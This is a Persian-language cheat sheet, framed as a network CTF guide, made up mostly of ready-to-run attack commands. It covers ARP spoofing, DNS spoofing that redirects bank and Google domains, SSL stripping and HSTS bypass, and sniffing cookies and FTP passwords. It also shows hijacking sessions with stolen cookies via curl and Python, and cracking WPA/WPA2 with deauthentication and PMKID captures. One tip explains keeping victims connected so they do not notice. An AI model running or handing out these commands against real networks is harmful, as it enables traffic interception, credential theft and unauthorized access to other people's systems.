📋 فاز ۰: آماده‌سازی محیط شبکه

۱. شناسایی شبکه و دستگاه‌ها

bash 
# شناسایی شبکه محلی
ip a
ifconfig

# شناسایی تمام دستگاه‌های شبکه

arp-scan --local

# شناسایی دستگاه‌های خاص
nmap -O 192.168.1.1-254
nmap -sV 192.168.1.100

۲. فعال کردن IP Forwarding (مهم!)

bash 
# فعال کردن موقت
echo 1 > /proc/sys/net/ipv4/ip_forward

# فعال کردن دائم
sysctl -w net.ipv4.ip_forward=1
echo "net.ipv4.ip_forward=1" >> /etc/sysctl.conf

# بررسی
cat /proc/sys/net/ipv4/ip_forward
sysctl net.ipv4.ip_forward

۳. پیکربندی iptables برای NAT

bash 
# تنظیم NAT برای ارسال ترافیک
iptables -t nat -A POSTROUTING -o eth0 -j MASQUERADE
iptables -t nat -A PREROUTING -i eth0 -p tcp --dport 80 -j REDIRECT --to-port 8080

# فعال کردن logging
iptables -A FORWARD -j LOG --log-prefix "FORWARD: "

🎯 فاز ۱: حملات مرد میانی (MITM)

۱. ARP Spoofing (مسموم کردن جدول ARP)

bash 
# با ابزار arpspoof (از dsniff)
apt-get install dsniff

# Spoof کردن قربانی به گیت‌وی
arpspoof -i eth0 -t 192.168.1.100 192.168.1.1

# Spoof کردن گیت‌وی به قربانی
arpspoof -i eth0 -t 192.168.1.1 192.168.1.100

# هر دو جهت (بهتر)
arpspoof -i eth0 -t 192.168.1.100 192.168.1.1 &
arpspoof -i eth0 -t 192.168.1.1 192.168.1.100 &

# با ابزار ettercap
ettercap -T -M arp:remote /192.168.1.100// /192.168.1.1//

# با bettercap
bettercap -eval "set arp.spoof.targets 192.168.1.100; arp.spoof on; net.sniff on"

۲. DNS Spoofing (جعل پاسخ DNS)

bash 
# با ettercap
cat > /etc/ettercap/etter.dns << EOF
*.target.com A 192.168.1.50
*.google.com A 192.168.1.50
bank.com A 192.168.1.50
*.bank.com A 192.168.1.50
EOF

ettercap -T -M arp:remote /192.168.1.100// /192.168.1.1// -P dns_spoof

# با bettercap
bettercap -eval "set dns.spoof.domains target.com; set dns.spoof.address 192.168.1.50; dns.spoof on; arp.spoof on"

# با dnschef
pip install dnschef
dnschef --fakeip=192.168.1.50 --fakedomains=target.com,google.com -i 0.0.0.0 -p 53

۳. حملات MITM پیشرفته (SSL Strip)

bash 
# با ettercap
ettercap -T -M arp:remote /192.168.1.100// /192.168.1.1// -F sslstrip.filter

# با bettercap
bettercap -eval "set arp.spoof.targets 192.168.1.100; arp.spoof on; set https.proxy.sslstrip true; https.proxy on"

# HSTS Bypass با bettercap
bettercap -eval "set arp.spoof.targets 192.168.1.100; arp.spoof on; set https.proxy.hsts_bypass true; https.proxy on"

📡 فاز ۲: شنود ترافیک (Sniffing)

۱. ابزارهای شنود پیشرفته (tcpdump)

bash 
# شنود تمام ترافیک
tcpdump -i eth0

# فقط HTTP
tcpdump -i eth0 -A -s 0 'tcp port 80'
tcpdump -i eth0 -A -s 0 'tcp port 80 and (tcp[((tcp[12:1] & 0xf0) >> 2):4] = 0x47455420)'  # GET requests

# فقط POST
tcpdump -i eth0 -A -s 0 'tcp port 80 and (tcp[((tcp[12:1] & 0xf0) >> 2):4] = 0x504f5354)'

# HTTP با هدرها
tcpdump -i eth0 -A -s 0 'tcp port 80' | grep -E "(GET|POST|Host|Cookie)"

# فقط DNS
tcpdump -i eth0 -vvv -s 0 port 53

# فقط FTP
tcpdump -i eth0 -A -s 0 'tcp port 21'

# با فیلتر ip
tcpdump -i eth0 host 192.168.1.100
tcpdump -i eth0 src 192.168.1.100
tcpdump -i eth0 dst 192.168.1.100

# ذخیره در فایل
tcpdump -i eth0 -w capture.pcap
tcpdump -r capture.pcap

۲. فیلترهای ضروری Wireshark

bash 
# HTTP
http
http.request.method == "GET"
http.request.method == "POST"
http.request.uri contains "login"
http.cookie
http.host == "target.com"

# DNS
dns
dns.qry.name contains "target"
dns.resp.addr == 192.168.1.50
dns.flags.response == 0  # فقط درخواست‌ها

# ARP
arp
arp.opcode == 1  # درخواست
arp.opcode == 2  # پاسخ
arp.src.proto_ipv4 == 192.168.1.100

# TCP/UDP
tcp.port == 80
udp.port == 53
tcp.flags.syn == 1
tcp.flags.reset == 1

# IP
ip.addr == 192.168.1.100
ip.src == 192.168.1.100
ip.dst == 192.168.1.100
ip.ttl < 64

# SMB
smb
smb.cmd == 1  # SMB Negotiate
smb2

# FTP
ftp
ftp.request.command == "USER"
ftp.request.command == "PASS"

# Telnet
telnet

# کوکی‌ها
http.cookie
http.cookie contains "session"

🍪 فاز ۳: ربودن نشست (Session Hijacking)

۱. استخراج کوکی از ترافیک

bash 
# استخراج کوکی‌های HTTP
tcpdump -i eth0 -A -s 0 'tcp port 80' | grep -E "(Cookie|Set-Cookie)"

# ذخیره در فایل
tcpdump -i eth0 -A -s 0 'tcp port 80' | grep Cookie > cookies.txt

# با Wireshark
# فیلتر: http.cookie
# سپس: right-click -> Follow TCP Stream
# کوکی را کپی کنید

۲. استفاده از کوکی‌های دزدیده شده

bash 
# با curl
curl -H "Cookie: PHPSESSID=abc123; user=admin" http://target.com/admin

# ذخیره کوکی
curl -c cookies.txt http://target.com/login
curl -b cookies.txt http://target.com/dashboard

۳. استفاده با Python

python 
import requests

cookies = {
    'PHPSESSID': 'abc123',
    'user': 'admin'
}
response = requests.get('http://target.com/admin', cookies=cookies)
print(response.text)

۲. حملات WPA/WPA2

bash 
# مرحله 1: شنود
airodump-ng -c 6 --bssid XX:XX:XX:XX:XX:XX -w capture wlan0mon

# مرحله 2: Deauthentication (قطع اتصال)
aireplay-ng -0 5 -a XX:XX:XX:XX:XX:XX wlan0mon

# مرحله 3: گرفتن handshake
# در airodump-ng پیام [WPA handshake] را ببینید

# کرک کردن (Cracking) WPA/WPA2:
aircrack-ng -w /usr/share/wordlists/rockyou.txt capture-01.cap

# با hashcat
cap2hccapx capture-01.cap capture.hccapx
hashcat -m 2500 capture.hccapx /usr/share/wordlists/rockyou.txt

# حملات PMKID (بدون نیاز به handshake)
hcxdumptool -i wlan0mon --enable_status=1 -o capture.pcap
hcxpcaptool -z hash.txt capture.pcap
hashcat -m 16800 hash.txt /usr/share/wordlists/rockyou.txt

۴. حملات WEP و Deauthentication

bash

# WEP: ARP Replay
aireplay-ng -3 -b XX:XX:XX:XX:XX:XX -h YY:YY:YY:YY:YY:YY wlan0mon

✅ چک‌لیست نهایی CTF شبکه

فاز 1: آماده‌سازی

  • ip a (شناسایی interface)
  • echo 1 > /proc/sys/net/ipv4/ip_forward (IP forwarding)
  • iptables -t nat -A POSTROUTING -o eth0 -j MASQUERADE (NAT)

فاز 2: شناسایی

  • arp-scan --local (دستگاه‌های شبکه)
  • nmap -sn 192.168.1.0/24 (شناسایی)
  • netdiscover -r 192.168.1.0/24 (شناسایی)
  • airmon-ng start wlan0 (برای WiFi)

فاز 3: MITM

  • arpspoof -i eth0 -t target gateway (ARP Spoof)
  • ettercap -T -M arp:remote /target// /gateway// (ARP Spoof)
  • dns.spoof (DNS Spoof)
  • https.proxy.sslstrip (SSL Strip)

فاز 4: Sniffing

  • tcpdump -i eth0 -A -s 0 'tcp port 80' (HTTP)
  • tcpdump -i eth0 -vvv port 53 (DNS)
  • tcpdump -i eth0 -A -s 0 'tcp port 21' (FTP)
  • Wireshark filters (http, dns, smb)

💡 نکات طلایی پیشرفته برای CTF

  1. IP Forwarding را فراموش نکنید: بدون آن، قربانی اینترنت ندارد و متوجه می‌شود
  2. فیلترهای Wireshark را حفظ کنید: سرعت تحلیل را چند برابر می‌کند
  3. هدفمند باشید: در CTF معمولاً یک دستگاه خاص هدف است
  4. ترافیک را ذخیره کنید: همیشه -w در tcpdump برای تحلیل بعدی
  5. از ترکیب روش‌ها استفاده کنید: ARP Spoofing + DNS Spoofing + SSL Strip
  6. به پروتکل‌های خاص توجه کنید: FTP, Telnet, HTTP (غیر امن) - زودتر نتیجه می‌دهند
  7. در WiFi: اگر Handshake گرفتید، حتماً آن را ذخیره کنید
  8. از تکنیک‌های دور زدن استفاده کنید: HSTS Bypass, Captive Portal Bypass
  9. همیشه log داشته باشید: برای گزارش نهایی
  10. با ابزارهای مختلف تست کنید: اگر یکی جواب نداد، دیگری را امتحان کنید
